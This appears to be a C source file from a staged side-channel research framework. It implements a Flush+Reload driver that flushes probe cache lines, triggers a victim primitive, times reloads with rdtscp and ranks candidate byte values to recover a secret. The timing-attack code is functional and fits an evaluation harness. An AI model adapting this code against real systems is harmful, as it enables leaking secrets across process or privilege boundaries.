// stage3_driver_safe.c
// Stage3: recover secret by Flush+Reload using the secret state already set by Stage2
// Safe version (runtime-configurable):
//   - DOES NOT call vf_set_secret()
//   - Reuses current secret state prepared by Stage2
//   - Detection rounds and byte-domain size are fixed for comparability;
//     remaining tunable parameters are read from environment variables.

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <strings.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <time.h>
#include <limits.h>

#include "stage3_observer.h"

#ifndef STAGE3_MAX_CANDIDATES
#define STAGE3_MAX_CANDIDATES 256
#endif

#if STAGE3_DETECTION_CANDIDATES > STAGE3_MAX_CANDIDATES
#error "fixed Stage 3 candidate domain exceeds backend storage"
#endif

// 编译期默认值（仅作为 env 缺省时的回退）
#ifndef STAGE3_DEFAULT_CACHE_HIT_THRESHOLD
#define STAGE3_DEFAULT_CACHE_HIT_THRESHOLD 80
#endif

#ifndef STAGE3_DEFAULT_USE_POC_PERMUTATION
#define STAGE3_DEFAULT_USE_POC_PERMUTATION 1
#endif

#ifndef STAGE3_DEFAULT_FLUSH_WAIT
#define STAGE3_DEFAULT_FLUSH_WAIT 100
#endif

#ifndef STAGE3_DEFAULT_RELOAD_WAIT
#define STAGE3_DEFAULT_RELOAD_WAIT 100
#endif

// Victim framework API
void vf_run_attack_once(void);
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s);
void vf_prepare_probe_region(int candidate_count);

// =====================================================================
// 运行时可调参数（由 stage3_init_runtime_params_from_env 从 env 注入）
// =====================================================================
static int g_cache_hit_threshold = STAGE3_DEFAULT_CACHE_HIT_THRESHOLD;
static int g_use_poc_permutation = STAGE3_DEFAULT_USE_POC_PERMUTATION;
static int g_flush_wait_cycles   = STAGE3_DEFAULT_FLUSH_WAIT;
static int g_reload_wait_cycles  = STAGE3_DEFAULT_RELOAD_WAIT;
static int g_stage3_dump_times   = 0;

// 供外部调用，从环境变量读取运行时参数
void stage3_init_runtime_params_from_env(void)
{
    const char *s;

    if ((s = getenv("STAGE3_CACHE_HIT_THRESHOLD")) && s[0]) {
        int v = atoi(s);
        if (v > 0) g_cache_hit_threshold = v;
    }
    if ((s = getenv("STAGE3_USE_PERMUTATION")) && s[0]) {
        g_use_poc_permutation = atoi(s) ? 1 : 0;
    }
    if ((s = getenv("STAGE3_FLUSH_WAIT")) && s[0]) {
        int v = atoi(s);
        if (v >= 0) g_flush_wait_cycles = v;
    }
    if ((s = getenv("STAGE3_RELOAD_WAIT")) && s[0]) {
        int v = atoi(s);
        if (v >= 0) g_reload_wait_cycles = v;
    }
    if ((s = getenv("STAGE3_DUMP_TIMES")) && s[0]) {
        g_stage3_dump_times = atoi(s) == 1 ? 1 : 0;
    }

    fprintf(stderr,
        "[stage3] runtime params: cache_hit_threshold=%d, use_perm=%d, "
        "flush_wait=%d, reload_wait=%d, dump_times=%d\n",
        g_cache_hit_threshold, g_use_poc_permutation,
        g_flush_wait_cycles, g_reload_wait_cycles, g_stage3_dump_times);
}

// =====================================================================
// low-level helpers
// =====================================================================
static inline void stage3_flush_line(void *addr) {
    _mm_clflush(addr);
}

static inline uint64_t stage3_reload_timed(volatile uint8_t *addr) {
    unsigned int junk = 0;
    uint64_t t1, t2;
    _mm_mfence();
    _mm_lfence();
    t1 = __rdtscp(&junk);
    junk = *addr;
    _mm_lfence();
    t2 = __rdtscp(&junk);
    return (t2 - t1);
}

// 简单的空转等待，由 g_flush_wait_cycles / g_reload_wait_cycles 控制
static inline void stage3_busy_wait(int cycles) {
    volatile int z;
    for (z = 0; z < cycles; z++) { /* spin */ }
}

// debug flags
volatile int g_stage3_dump_order = 0;
volatile int g_stage3_dump_round_summary = 1;

// =====================================================================
// mode helpers
// =====================================================================
const char *stage3_mode_to_string(stage3_mode_t mode)
{
    switch (mode) {
        case STAGE3_MODE_NONE:         return "none";
        case STAGE3_MODE_FLUSH_RELOAD: return "flush-reload";
        case STAGE3_MODE_PRIME_PROBE:  return "prime-probe";
        case STAGE3_MODE_CUSTOM:       return "custom";
        default:                       return "unknown";
    }
}

int stage3_parse_mode(const char *s, stage3_mode_t *out_mode)
{
    if (!s || !out_mode) return -1;

    if (strcasecmp(s, "none") == 0) {
        *out_mode = STAGE3_MODE_NONE; return 0;
    }
    if (strcasecmp(s, "flush-reload") == 0 ||
        strcasecmp(s, "flush_reload") == 0 ||
        strcasecmp(s, "fr") == 0) {
        *out_mode = STAGE3_MODE_FLUSH_RELOAD; return 0;
    }
    if (strcasecmp(s, "prime-probe") == 0 ||
        strcasecmp(s, "prime_probe") == 0 ||
        strcasecmp(s, "pp") == 0) {
        *out_mode = STAGE3_MODE_PRIME_PROBE; return 0;
    }
    if (strcasecmp(s, "custom") == 0) {
        *out_mode = STAGE3_MODE_CUSTOM; return 0;
    }
    return -1;
}

// =====================================================================
// utilities
// =====================================================================
static void stage3_result_zero(stage3_result_t *out) {
    if (!out) return;
    memset(out, 0, sizeof(*out));
    out->expected_secret = 0;
    out->top1_value = 0;
    out->top2_value = 0;
    out->top1_score = -1;
    out->top2_score = -1;
    out->match = 0;
}

// PoC-style permutation: mix_i = ((i * 167) + 13) & 255;
// 当 g_use_poc_permutation==0 或 n!=256 时，使用 Fisher-Yates 洗牌。
static void stage3_make_reload_order(int *order, int n) {
    int i;
    if (!order || n <= 0) return;

    if (g_use_poc_permutation && n == 256) {
        for (i = 0; i < 256; i++) {
            order[i] = ((i * 167) + 13) & 255;
        }
        return;
    }

    for (i = 0; i < n; i++) order[i] = i;
    for (i = n - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = order[i];
        order[i] = order[j];
        order[j] = tmp;
    }
}

static void stage3_find_top2(const int *scores,
                             int candidate_count,
                             int *out_top1_idx,
                             int *out_top1_score,
                             int *out_top2_idx,
                             int *out_top2_score)
{
    int i;
    int top1_idx = -1, top2_idx = -1;
    int top1_score = -1, top2_score = -1;

    for (i = 0; i < candidate_count; i++) {
        if (top1_idx < 0 || scores[i] > top1_score) {
            top2_idx = top1_idx;
            top2_score = top1_score;
            top1_idx = i;
            top1_score = scores[i];
        } else if (top2_idx < 0 || scores[i] > top2_score) {
            top2_idx = i;
            top2_score = scores[i];
        }
    }

    if (out_top1_idx)   *out_top1_idx = top1_idx;
    if (out_top1_score) *out_top1_score = top1_score;
    if (out_top2_idx)   *out_top2_idx = top2_idx;
    if (out_top2_score) *out_top2_score = top2_score;
}

static int stage3_should_early_stop(int top1_score, int top2_score)
{
    (void)top1_score;
    (void)top2_score;
    return 0;
}

// =====================================================================
// Backend: flush-reload (reuse secret)
// =====================================================================
static int stage3_backend_flush_reload_reuse_secret(
    const stage3_config_t *cfg,
    uint8_t expected_secret,
    stage3_result_t *out)
{
    int candidate_count;
    int rounds;
    int attack_reps;
    int results[STAGE3_MAX_CANDIDATES];
    int measured_counts[STAGE3_MAX_CANDIDATES];
    volatile uint8_t *probes[STAGE3_MAX_CANDIDATES];
    uint64_t times[STAGE3_MAX_CANDIDATES];
    int reload_order[STAGE3_MAX_CANDIDATES];

    int i, r;

    if (!cfg || !out) return -1;
    stage3_result_zero(out);

    /* Scan the complete uint8_t domain for every candidate. */
    candidate_count = STAGE3_DETECTION_CANDIDATES;

    /* Keep the observation budget identical for every candidate. */
    rounds = STAGE3_DETECTION_ROUNDS;

    attack_reps = cfg->attack_repetitions;
    if (attack_reps <= 0) attack_reps = 1;

    memset(results, 0, sizeof(results));
    memset(measured_counts, 0, sizeof(measured_counts));

    for (i = 0; i < candidate_count; i++) {
        probes[i] = (volatile uint8_t *)vf_get_probe_addr_for_secret((uint8_t)i);
        if (!probes[i]) {
            fprintf(stderr, "[stage3] vf_get_probe_addr_for_secret(%d) returned NULL\n", i);
            return -2;
        }
    }

    {
        static int global_seeded = 0;
        if (!global_seeded) {
            unsigned int seed = (unsigned int)time(NULL) ^
                                (unsigned int)(uintptr_t)probes[0];
            srand(seed);
            global_seeded = 1;
        }
    }

    vf_prepare_probe_region(candidate_count);

    for (r = 0; r < rounds; r++) {
        int top1_idx = -1, top2_idx = -1;
        int top1_score = -1, top2_score = -1;

        for (i = 0; i < candidate_count; i++) {
            times[i] = ULLONG_MAX;
        }

        stage3_make_reload_order(reload_order, candidate_count);

        if (g_stage3_dump_order) {
            for (i = 0; i < candidate_count; i++) {
                printf("STAGE3_DEBUG_ROUND[%d]_RELOAD_ORDER[%d]=%d\n",
                       r, i, reload_order[i]);
            }
        }

        // Flush all probe lines.
        for (i = 0; i < candidate_count; i++) {
            stage3_flush_line((void *)probes[i]);
        }
        _mm_mfence();

        // ✅ 由 env 控制的 flush 后等待
        stage3_busy_wait(g_flush_wait_cycles);

        // Trigger victim attack primitive.
        for (i = 0; i < attack_reps; i++) {
            vf_run_attack_once();
        }

        // ✅ 由 env 控制的 reload 前等待
        stage3_busy_wait(g_reload_wait_cycles);

        // Reload ALL candidates (PoC-like permuted order).
        for (i = 0; i < candidate_count; i++) {
            int idx = reload_order[i];
            uint64_t dt = stage3_reload_timed(probes[idx]);
            times[idx] = dt;
            measured_counts[idx]++;

            // ✅ 阈值改为 g_cache_hit_threshold（运行时可调）
            if (dt <= (uint64_t)g_cache_hit_threshold) {
                results[idx]++;
            }
        }

        stage3_find_top2(results,
                         candidate_count,
                         &top1_idx, &top1_score,
                         &top2_idx, &top2_score);

        if (g_stage3_dump_round_summary || cfg->verbose) {
            printf("STAGE3_DEBUG_ROUND[%d]_SUMMARY EXPECTED=%u TOP1=%d SCORE1=%d TOP2=%d SCORE2=%d\n",
                   r,
                   (unsigned)expected_secret,
                   top1_idx, top1_score,
                   top2_idx, top2_score);
        }

        if (g_stage3_dump_times) {
            printf("STAGE3_DEBUG_ROUND[%d]_TIMES_BEGIN\n", r);
            for (i = 0; i < candidate_count; i++) {
                int is_expected = ((int)expected_secret == i) ? 1 : 0;
                /* Candidate indices are byte labels. None is noise by value. */
                int is_noise = 0;
                printf("STAGE3_DEBUG_ROUND[%d]_TIME[%d]=%llu EXPECTED=%d NOISE=%d SCORE=%d MEASURED=%d\n",
                       r, i,
                       (unsigned long long)times[i],
                       is_expected,
                       is_noise,
                       results[i],
                       measured_counts[i]);
            }
            printf("STAGE3_DEBUG_ROUND[%d]_TIMES_END\n", r);
        }

        if (stage3_should_early_stop(top1_score, top2_score)) {
            if (cfg->verbose) {
                printf("[stage3] early-stop at round=%d expected=%u top1=%d score1=%d top2=%d score2=%d\n",
                       r, (unsigned)expected_secret,
                       top1_idx, top1_score, top2_idx, top2_score);
            }
            break;
        }
    }

    {
        int top1_idx = -1, top2_idx = -1;
        int top1_score = -1, top2_score = -1;

        stage3_find_top2(results,
                         candidate_count,
                         &top1_idx, &top1_score,
                         &top2_idx, &top2_score);

        out->expected_secret = expected_secret;
        out->top1_value = (top1_idx >= 0) ? (uint8_t)top1_idx : 0;
        out->top2_value = (top2_idx >= 0) ? (uint8_t)top2_idx : 0;
        out->top1_score = top1_score;
        out->top2_score = top2_score;
        out->match = ((top1_idx == (int)expected_secret) ||
                      (top2_idx == (int)expected_secret)) ? 1 : 0;
    }

    return 0;
}

int stage3_run_single_reuse_secret(const stage3_config_t *cfg,
                                   uint8_t secret,
                                   stage3_result_t *out_result)
{
    if (!cfg || !out_result) return -1;

    switch (cfg->mode) {
        case STAGE3_MODE_FLUSH_RELOAD:
            return stage3_backend_flush_reload_reuse_secret(cfg, secret, out_result);
        case STAGE3_MODE_PRIME_PROBE:
            fprintf(stderr, "[stage3] prime-probe mode not implemented in safe driver\n");
            return -2;
        case STAGE3_MODE_CUSTOM:
            fprintf(stderr, "[stage3] custom mode not implemented in safe driver\n");
            return -3;
        default:
            fprintf(stderr, "[stage3] unknown mode=%d\n", (int)cfg->mode);
            return -4;
    }
}

int stage3_run_batch(const stage3_config_t *cfg,
                     const uint8_t *secrets,
                     int secret_count,
                     stage3_result_t *results)
{
    int i;
    if (!cfg || !secrets || secret_count <= 0 || !results) return -1;

    for (i = 0; i < secret_count; i++) {
        int rc = stage3_run_single_reuse_secret(cfg, secrets[i], &results[i]);
        if (rc != 0) return rc;
    }
    return 0;
}
